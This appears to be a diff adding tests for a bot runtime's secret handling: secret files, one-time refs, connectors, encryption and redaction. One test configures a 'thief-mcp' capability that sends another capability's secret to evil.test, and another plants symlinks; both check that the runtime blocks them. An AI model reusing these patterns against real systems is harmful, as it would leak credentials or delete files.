@@ -1,11 +1,12 @@
 import assert from 'node:assert/strict'
 import { spawnSync } from 'node:child_process'
 import { randomBytes } from 'node:crypto'
-import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { test } from 'node:test'
 import { createRuntime } from '../index.js'
+import { CONNECTOR_IDS } from '../src/host/capabilities.js'
 import { createSecretRefs, SECRET_REF_PATTERN } from '../src/host/secret-refs.js'
 import { decryptSecrets, isEncryptedSecretsFile } from '../src/host/secrets-crypto.js'
 import { fakeContext } from './fake-ctx.js'
@@ -334,4 +335,439 @@ test('optional Shell File Mode exposes $DSH_SECRET_FILE_<NAME> pointing to a 060
   assert.equal((await bench.call('set-prefs', { secretShellMode: 'env' })).ok, true)
   assert.equal(existsSync(filePath), false)
   assert.deepEqual(bench.env('b2'), { DSH_SECRET_SSH_CERT: secret })
+})
+
+test('Shell File Mode immediately unlinks stale files on value change, scope revoke, secret delete, and bot delete', async (t) => {
+  const bench = start()
+  t.after(bench.stop)
+  const v1 = fresh()
+  const v2 = fresh()
+  const sharedVal = fresh()
+
+  assert.equal((await bench.call('set-prefs', { secretShellMode: 'file' })).ok, true)
+  assert.equal((await bench.call('secret-set', { name: 'SCOPED_KEY', value: v1, scope: ['b2', 'c3'] })).ok, true)
+  assert.equal((await bench.call('secret-set', { name: 'SHARED_KEY', value: sharedVal, scope: 'all' })).ok, true)
+
+  const b2Env1 = bench.env('b2')
+  const c3Env1 = bench.env('c3')
+  const b2ScopedPath1 = b2Env1.DSH_SECRET_FILE_SCOPED_KEY
+  const c3ScopedPath1 = c3Env1.DSH_SECRET_FILE_SCOPED_KEY
+  const b2SharedPath = b2Env1.DSH_SECRET_FILE_SHARED_KEY
+  const c3SharedPath = c3Env1.DSH_SECRET_FILE_SHARED_KEY
+  for (const p of [b2ScopedPath1, c3ScopedPath1, b2SharedPath, c3SharedPath]) {
+    assert.equal(existsSync(p), true)
+    assert.equal(bench.rt.secrets.activeShellFilePaths().has(p), true)
+  }
+
+  // 1. Value update immediately unlinks old files and issues a fresh content-hashed path.
+  assert.equal((await bench.call('secret-set', { name: 'SCOPED_KEY', value: v2 })).ok, true)
+  assert.equal(existsSync(b2ScopedPath1), false)
+  assert.equal(existsSync(c3ScopedPath1), false)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(b2ScopedPath1), false)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(c3ScopedPath1), false)
+  const b2ScopedPath2 = bench.env('b2').DSH_SECRET_FILE_SCOPED_KEY
+  const c3ScopedPath2 = bench.env('c3').DSH_SECRET_FILE_SCOPED_KEY
+  assert.notEqual(b2ScopedPath2, b2ScopedPath1)
+  assert.equal(readFileSync(b2ScopedPath2, 'utf8'), v2)
+  assert.equal(readFileSync(c3ScopedPath2, 'utf8'), v2)
+
+  // 2. Scope revocation immediately unlinks c3's file while keeping b2's intact.
+  assert.equal((await bench.call('secret-update', { name: 'SCOPED_KEY', scope: ['b2'] })).ok, true)
+  assert.equal(existsSync(c3ScopedPath2), false)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(c3ScopedPath2), false)
+  assert.equal(existsSync(b2ScopedPath2), true)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(b2ScopedPath2), true)
+
+  // 3. Secret deletion immediately unlinks b2's file.
+  assert.equal((await bench.call('secret-delete', { name: 'SCOPED_KEY' })).ok, true)
+  assert.equal(existsSync(b2ScopedPath2), false)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(b2ScopedPath2), false)
+
+  // 4. Bot deletion immediately unlinks c3's scope='all' shell file while keeping b2's intact.
+  assert.equal((await bench.call('delete-bot', { id: 'c3' })).ok, true)
+  assert.equal(existsSync(c3SharedPath), false)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(c3SharedPath), false)
+  assert.equal(existsSync(b2SharedPath), true)
+  assert.equal(bench.rt.secrets.activeShellFilePaths().has(b2SharedPath), true)
+})
+
+test('save_capability secret-ref uses host-only scope [], validates before consuming, sanitizes names, mounts cleanly, and avoids regex races', async (t) => {
+  const home = mkdtempSync(join(tmpdir(), 'ds-bot-cap-refs-'))
+  writeFileSync(join(home, 'state.json'), JSON.stringify(TEAM))
+  const mountedConfigs = []
+  const mcpPlugin = { name: 'mcp-client', apply() {} }
+  const loader = { import: async () => ({ default: mcpPlugin }), unwrapExports: exports => exports.default }
+  const contributors = []
+  const shellEnv = {
+    register(contributor) {
+      const entry = { ...contributor, live: true }
+      contributors.push(entry)
+      return () => { entry.live = false }
+    },
+  }
+  const ctx = fakeContext({ services: { shellEnv, loader } })
+  ctx.sessionController = { resolveAgent: async id => ({ agent: { session: { id }, followup: () => {} } }) }
+  ctx.sessions = { flush: async () => {} }
+  ctx.workspaceRegistry = { archiveSession: async () => {} }
+  ctx.llm.stream = () => (async function* () {})()
+  const rt = createRuntime(ctx, { home, github: false, diagnosticsFile: false })
+  t.after(async () => {
+    await ctx.dispose()
+    rmSync(home, { recursive: true, force: true, maxRetries: 5 })
+  })
+  const envOf = (agentId) => contributors.filter(e => e.live).at(-1)?.resolve({ agent: { id: agentId, session: { header: { id: agentId } } }, arguments: {} }) ?? {}
+
+  // 1. Validation failure BEFORE consuming preserves the one-time ref unconsumed & creates 0 orphan secrets.
+  const secret1 = fresh()
+  const ref1 = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'r-val', field: 'KEY', value: secret1 })
+  await assert.rejects(
+    () => rt.capabilitySave({
+      name: 'bad-url-mcp',
+      kind: 'mcp',
+      transport: 'streamable-http',
+      url: 'not-a-valid-url',
+      headers: { Authorization: `Bearer ${ref1}` },
+    }, { botId: 'b2' }),
+    /valid HTTP or HTTPS URL/i,
+  )
+  await assert.rejects(
+    () => rt.capabilitySave({
+      name: 'bad-cmd-mcp',
+      kind: 'mcp',
+      transport: 'stdio',
+      command: '',
+      env: { API_KEY: ref1 },
+    }, { botId: 'b2' }),
+    /command/i,
+  )
+  assert.equal(rt.secretsView().length, 0, 'failed validation must leave zero orphan secrets')
+
+  // 2. Dotted/colon header names sanitize cleanly, secret is stored with scope: [] (never in Bot shell env!),
+  //    and MCP mounting resolves the capability-owned secret while rejecting theft by another capability.
+  const saved = await rt.capabilitySave({
+    name: 'dotted-mcp',
+    kind: 'mcp',
+    transport: 'streamable-http',
+    url: 'https://example.test/mcp',
+    headers: { 'X-Api.Key:v1': `Token ${ref1}` },
+  }, { botId: 'b2' })
+  const headerVal = saved.headers['X-Api.Key:v1']
+  assert.match(headerVal, /^Token \$DSH_SECRET_CAP_DOTTED_MCP_X_API_KEY_V1_[A-F0-9]{8}$/)
+  const secretName = headerVal.slice('Token $DSH_SECRET_'.length)
+  const storedSecret = rt.secretsView().find(s => s.name === secretName)
+  assert.deepEqual(storedSecret.scope, [], 'capability ref secret must have host-only scope []')
+  assert.deepEqual(envOf('b2'), {}, 'Bot shell env must NEVER receive capability ref secret')
+
+  // Mount dotted-mcp on b2's agent — capability-owned scope: [] secret MUST still resolve for its own MCP!
+  const disposers = []
+  const agent = {
+    id: 'b2',
+    session: { id: 'b2' },
+    ctx: {
+      extend(meta) { return Object.assign(Object.create(this), meta) },
+      effect(fn) { const d = fn(); if (typeof d === 'function') disposers.push(d) },
+      tools: { register: () => () => {} },
+      plugin(_plugin, config) {
+        mountedConfigs.push(config)
+        return { await: async () => {}, dispose: () => {} }
+      },
+    },
+  }
+  await rt.changeCapabilityAttachment('attach', { name: 'dotted-mcp' }, 'b2')
+  ctx.emit('agent/created', { agent })
+  await rt.reconcileCapabilities()
+  const mounted = mountedConfigs.find(c => c?.serverName === 'dotted-mcp')
+  assert.ok(mounted, 'dotted-mcp must mount cleanly with its owned host-only secret')
+  assert.equal(mounted.headers['X-Api.Key:v1'], `Token ${secret1}`)
+
+  // Another capability referencing $DSH_SECRET_<secretName> MUST NOT be allowed to read dotted-mcp's secret!
+  await rt.capabilitySave({
+    name: 'thief-mcp',
+    kind: 'mcp',
+    transport: 'streamable-http',
+    url: 'https://evil.test/mcp',
+    headers: { Stolen: `$DSH_SECRET_${secretName}` },
+  }, { botId: 'b2' })
+  await rt.changeCapabilityAttachment('attach', { name: 'thief-mcp' }, 'b2')
+  await rt.reconcileCapabilities()
+  assert.equal(mountedConfigs.find(c => c?.serverName === 'thief-mcp'), undefined)
+  assert.equal(rt.capabilityStatusesView().b2['thief-mcp'].state, 'error')
+
+  // Deleting dotted-mcp cleans up its owned secret.
+  await rt.capabilityDelete('dotted-mcp', { botId: 'b2' })
+  assert.equal(rt.secretsView().find(s => s.name === secretName), undefined)
+
+  // 3. Concurrent save_capability calls with secret-ref: in URL both consume cleanly (no /g regex race).
+  const sA = fresh()
+  const sB = fresh()
+  const refA = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'conc-a', field: 'U', value: sA })
+  const refB = await rt.secrets.issueRef({ botId: 'c3', sessionId: 'c3', requestId: 'conc-b', field: 'U', value: sB })
+  const [capA, capB] = await Promise.all([
+    rt.capabilitySave({ name: 'conc-a', kind: 'mcp', transport: 'streamable-http', url: `https://a.test/mcp?k=${refA}` }, { botId: 'b2' }),
+    rt.capabilitySave({ name: 'conc-b', kind: 'mcp', transport: 'streamable-http', url: `https://b.test/mcp?k=${refB}` }, { botId: 'c3' }),
+  ])
+  assert.match(capA.url, /^https:\/\/a\.test\/mcp\?k=\$DSH_SECRET_CAP_CONC_A_URL_[A-F0-9]{8}$/)
+  assert.match(capB.url, /^https:\/\/b\.test\/mcp\?k=\$DSH_SECRET_CAP_CONC_B_URL_[A-F0-9]{8}$/)
+})
+
+test('reconcile() does not settle or mutate pending ref/file cards when a same-named vault secret changes', async (t) => {
+  const bench = start()
+  t.after(bench.stop)
+
+  await bench.tool('request_secret', { name: 'SHARED_TOKEN', purpose: 'one-time ref', delivery: 'ref' }, 'b2')
+  await bench.tool('request_secret', { name: 'SHARED_TOKEN', purpose: 'temp file', delivery: 'file' }, 'c3')
+  const before = await bench.view()
+  const refReq = before.secretRequests.b2[0]
+  const fileReq = before.secretRequests.c3[0]
+  assert.equal(refReq.status, 'pending')
+  assert.equal(refReq.kind, 'fill')
+  assert.equal(fileReq.status, 'pending')
+  assert.equal(fileReq.kind, 'fill')
+
+  const deliveredBefore = bench.delivered.length
+  // Save vault secret with same name (scope: 'all'), update scope, and delete it.
+  assert.equal((await bench.call('secret-set', { name: 'SHARED_TOKEN', value: fresh(), scope: 'all' })).ok, true)
+  assert.equal((await bench.call('secret-update', { name: 'SHARED_TOKEN', scope: ['m1'] })).ok, true)
+  assert.equal((await bench.call('secret-delete', { name: 'SHARED_TOKEN' })).ok, true)
+
+  const after = await bench.view()
+  assert.equal(after.secretRequests.b2[0].status, 'pending')
+  assert.equal(after.secretRequests.b2[0].kind, 'fill')
+  assert.equal(after.secretRequests.c3[0].status, 'pending')
+  assert.equal(after.secretRequests.c3[0].kind, 'fill')
+  assert.equal(bench.delivered.length, deliveredBefore, 'vault changes must not send notes for pending ref/file cards')
+
+  // secret-allow must reject non-vault requests.
+  assert.equal((await bench.call('secret-allow', { requestId: refReq.id })).ok, false)
+
+  // Both cards still answer cleanly through their intended delivery modes.
+  const refVal = fresh()
+  const fileVal = fresh()
+  assert.equal((await bench.call('secret-set', { requestId: refReq.id, value: refVal })).value.delivery, 'ref')
+  assert.equal((await bench.call('secret-set', { requestId: fileReq.id, value: fileVal })).value.delivery, 'file')
+})
+
+test('in-flight secret-ref files stay valid across secret-encrypt, secret-decrypt, and passphrase rotation', async (t) => {
+  const bench = start()
+  t.after(bench.stop)
+  const pass1 = 'first horse battery staple'
+  const pass2 = 'second horse battery staple'
+
+  // 1. Issue ref in plaintext mode, then encrypt the store -> ref file becomes encrypted & still consumes cleanly.
+  const s1 = fresh()
+  const ref1 = await bench.rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'pre-enc', field: 'K', value: s1 })
+  const ref1Path = join(bench.home, 'secret-refs', `${ref1.slice('secret-ref:'.length)}.json`)
+  assert.equal(readFileSync(ref1Path, 'utf8').includes(s1), true)
+
+  assert.equal((await bench.call('secret-encrypt', { passphrase: pass1 })).ok, true)
+  const encRaw = readFileSync(ref1Path, 'utf8')
+  assert.equal(encRaw.includes(s1), false, 'secret-encrypt must encrypt existing plaintext ref files on disk')
+  assert.equal(isEncryptedSecretsFile(JSON.parse(encRaw)), true)
+  assert.equal(await bench.rt.secrets.consumeRef(ref1, { botId: 'b2' }), s1)
+
+  // 2. Issue ref in encrypted mode, rotate passphrase via rekeyRefs, then decrypt store -> still consumes cleanly.
+  const s2 = fresh()
+  const ref2 = await bench.rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'pre-dec', field: 'K', value: s2 })
+  const ref2Path = join(bench.home, 'secret-refs', `${ref2.slice('secret-ref:'.length)}.json`)
+  assert.equal(isEncryptedSecretsFile(JSON.parse(readFileSync(ref2Path, 'utf8'))), true)
+
+  assert.equal((await bench.call('secret-decrypt', { passphrase: pass1 })).ok, true)
+  const decRaw = readFileSync(ref2Path, 'utf8')
+  assert.equal(isEncryptedSecretsFile(JSON.parse(decRaw)), false, 'secret-decrypt must decrypt existing encrypted ref files')
+  assert.equal(await bench.rt.secrets.consumeRef(ref2, { botId: 'b2' }), s2)
+
+  // 3. Direct passphrase rotation (pass1 -> pass2) on createSecretRefs.
+  const rotHome = mkdtempSync(join(tmpdir(), 'dsb-refs-rotate-'))
+  t.after(() => rmSync(rotHome, { recursive: true, force: true }))
+  let curPass = pass1
+  const refs = createSecretRefs({
+    home: rotHome,
+    getEncryption: () => ({ mode: 'encrypted', locked: false, passphrase: curPass }),
+  })
+  t.after(() => refs.dispose())
+  const s3 = fresh()
+  const ref3 = await refs.issueRef({ botId: 'b2', sessionId: 's', requestId: 'rot', field: 'K', value: s3 })
+  await refs.rekeyRefs({ fromPassphrase: pass1, toPassphrase: pass2 })
+  curPass = pass2
+  assert.equal(await refs.consumeRef(ref3, { botId: 'b2' }), s3)
+})
+
+test('connectors and mail consume secret-ref end-to-end, disambiguate multiple refs, validate first, and enforce Bot isolation', async (t) => {
+  const home = mkdtempSync(join(tmpdir(), 'ds-bot-conn-refs-'))
+  writeFileSync(join(home, 'state.json'), JSON.stringify(TEAM))
+  const ctx = fakeContext()
+  const mailLogins = []
+  ctx.sessionController = { resolveAgent: async () => ({ agent: { session: {}, followup: () => {} } }) }
+  ctx.sessions = { flush: async () => {} }
+  ctx.workspaceRegistry = { archiveSession: async () => {} }
+  ctx.llm.stream = () => (async function* () {})()
+  const rt = createRuntime(ctx, {
+    home,
+    github: false,
+    diagnosticsFile: false,
+    mail: {
+      connect: async (account, { password }) => {
+        mailLogins.push({ address: account.address, password })
+        return { usable: true, close: async () => {} }
+      },
+    },
+  })
+  t.after(async () => {
+    await ctx.dispose()
+    rmSync(home, { recursive: true, force: true, maxRetries: 5 })
+  })
+  await rt.load()
+
+  // 1. connector-add HTTP with TWO distinct secret-ref: handles in ONE header.
+  const u1 = fresh()
+  const p1 = fresh()
+  const rUser = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'c1', field: 'U', value: u1 })
+  const rPass = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'c2', field: 'P', value: p1 })
+
+  // Validation failure (insecure URL) must NOT consume refs or pollute CONNECTOR_IDS.
+  await assert.rejects(
+    () => rt.connectorEndpoint('connector-add', {
+      name: 'bad-http-conn',
+      url: 'http://insecure.example/mcp',
+      headers: { Authorization: `Basic ${rUser}:${rPass}` },
+      botId: 'b2',
+    }),
+    /https:\/\//,
+  )
+  assert.equal(CONNECTOR_IDS.has('bad-http-conn'), false)
+
+  // Mid-way failure (rUser valid, second ref belongs to another Bot) must roll back rUser's secret and NOT add to CONNECTOR_IDS.
+  const otherRef = await rt.secrets.issueRef({ botId: 'c3', sessionId: 'c3', requestId: 'c-other', field: 'X', value: fresh() })
+  const tempRef = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'c-tmp', field: 'T', value: fresh() })
+  await assert.rejects(
+    () => rt.connectorEndpoint('connector-add', {
+      name: 'rollback-conn',
+      url: 'https://good.example/mcp',
+      headers: { Authorization: `Basic ${tempRef}:${otherRef}` },
+      botId: 'b2',
+    }),
+    /another Bot/i,
+  )
+  assert.equal(CONNECTOR_IDS.has('rollback-conn'), false)
+  assert.equal(rt.secretsView().filter(s => s.name.includes('ROLLBACK_CONN')).length, 0)
+
+  // Valid connector-add with TWO distinct refs in ONE header: both stored separately and resolved in upstreamOf!
+  await rt.connectorEndpoint('connector-add', {
+    name: 'dual-auth',
+    url: 'https://dual.example/mcp',
+    headers: { Authorization: `Basic ${rUser}:${rPass}` },
+    botId: 'b2',
+  })
+  const upstream = rt.connectorsInternals.upstreamOf('dual-auth')
+  assert.equal(upstream.headers.Authorization, `Basic ${u1}:${p1}`)
+  assert.equal(CONNECTOR_IDS.has('dual-auth'), true)
+
+  // 2. connector-add stdio scans args AND env.
+  const argVal = fresh()
+  const envVal = fresh()
+  const rArg = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 's-arg', field: 'A', value: argVal })
+  const rEnv = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 's-env', field: 'E', value: envVal })
+  await rt.connectorEndpoint('connector-add', {
+    name: 'stdio-ref',
+    command: 'node',
+    args: ['--token', rArg],
+    env: { API_KEY: rEnv },
+    botId: 'b2',
+  })
+  const savedCustom = rt.state.connectors['stdio-ref'].custom
+  assert.match(savedCustom.args[1], /^\$DSH_SECRET_CONNECTOR_STDIO_REF_ARG_1_[A-F0-9]{8}$/)
+  assert.match(savedCustom.env.API_KEY, /^\$DSH_SECRET_CONNECTOR_STDIO_REF_ENV_API_KEY_[A-F0-9]{8}$/)
+  assert.equal(rt.secretValue(savedCustom.args[1].slice('$DSH_SECRET_'.length)), argVal)
+  assert.equal(rt.secretValue(savedCustom.env.API_KEY.slice('$DSH_SECRET_'.length)), envVal)
+
+  // 3. connector-connect (key auth) with secretRef and cross-Bot rejection.
+  const amapKey = fresh()
+  const rAmap = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'amap-1', field: 'KEY', value: amapKey })
+  await assert.rejects(
+    () => rt.connectorEndpoint('connector-connect', { id: 'amap', secretRef: rAmap, botId: 'c3' }),
+    /another Bot/i,
+  )
+  await rt.connectorEndpoint('connector-connect', { id: 'amap', secretRef: rAmap, botId: 'b2' })
+  assert.equal(rt.secretValue('CONNECTOR_AMAP_KEY'), amapKey)
+
+  // 4. mail-account-add validates IMAP/SMTP hosts BEFORE consuming ref, supports isSecretRef(body.password), and enforces Bot isolation.
+  const mailPw = fresh()
+  const rMail = await rt.secrets.issueRef({ botId: 'b2', sessionId: 'b2', requestId: 'mail-1', field: 'PW', value: mailPw })
+  await assert.rejects(
+    () => rt.connectorEndpoint('mail-account-add', {
+      address: 'user@custom.example',
+      provider: 'other',
+      password: rMail,
+      imapHost: '',
+      smtpHost: '',
+      botId: 'b2',
+    }),
+    /IMAP and SMTP/,
+  )
+  // Cross-Bot rejected while preserving ref for b2.
+  await assert.rejects(
+    () => rt.connectorEndpoint('mail-account-add', {
+      address: 'user@custom.example',
+      provider: 'other',
+      password: rMail,
+      imapHost: 'imap.custom.example',
+      smtpHost: 'smtp.custom.example',
+      botId: 'c3',
+    }),
+    /another Bot/i,
+  )
+  // Owner Bot consumes via body.password containing secret-ref:.
+  await rt.connectorEndpoint('mail-account-add', {
+    address: 'user@custom.example',
+    provider: 'other',
+    password: rMail,
+    imapHost: 'imap.custom.example',
+    smtpHost: 'smtp.custom.example',
+    botId: 'b2',
+  })
+  assert.deepEqual(mailLogins, [{ address: 'user@custom.example', password: mailPw }])
+})
+
+test('ephemeral redactor keeps multiple concurrent delivery=file secrets with the same key name redacted', async (t) => {
+  const bench = start()
+  t.after(bench.stop)
+  const s1 = fresh()
+  const s2 = fresh()
+
+  const r1 = await bench.tool('request_secret', { name: 'DEPLOY_TOKEN', purpose: 'first', delivery: 'file', value: s1 }, 'b2')
+  const r2 = await bench.tool('request_secret', { name: 'DEPLOY_TOKEN', purpose: 'second', delivery: 'file', value: s2 }, 'c3')
+  assert.equal(r1.text.includes(s1), false)
+  assert.equal(r2.text.includes(s2), false)
+
+  // BOTH secrets sharing the same key name must stay redacted concurrently!
+  assert.equal(
+    bench.rt.redactSecrets(`first=${s1} second=${s2}`),
+    'first=[secret:DEPLOY_TOKEN] second=[secret:DEPLOY_TOKEN]',
+  )
+})
+
+test('sweepExpiredRefs and sweepExpiredFiles use lstat and do not dereference symlinks', async (t) => {
+  if (process.platform === 'win32') return
+  const home = mkdtempSync(join(tmpdir(), 'dsb-refs-symlink-'))
+  t.after(() => rmSync(home, { recursive: true, force: true }))
+  const outsideFile = join(home, 'outside-target.txt')
+  writeFileSync(outsideFile, 'must-stay-intact')
+  const old = new Date(Date.now() - 48 * 3_600_000)
+  utimesSync(outsideFile, old, old)
+
+  const refs = createSecretRefs({ home })
+  t.after(() => refs.dispose())
+  // Ensure dirs exist
+  await refs.issueRef({ botId: 'b2', sessionId: 's', requestId: 'init', field: 'K', value: fresh() })
+  await refs.writeSecretFile({ botId: 'b2', sessionId: 's', name: 'INIT', value: fresh() })
+
+  const refLink = join(refs.refsDir, 'deadbeef.json')
+  const fileLink = join(refs.filesDir, 'sf-link.secret')
+  symlinkSync(outsideFile, refLink)
+  symlinkSync(outsideFile, fileLink)
+
+  await refs.sweepExpiredRefs({ maxAgeMs: 1 })
+  await refs.sweepExpiredFiles({ maxAgeMs: 1 })
+  assert.equal(existsSync(outsideFile), true)
+  assert.equal(readFileSync(outsideFile, 'utf8'), 'must-stay-intact')
 })
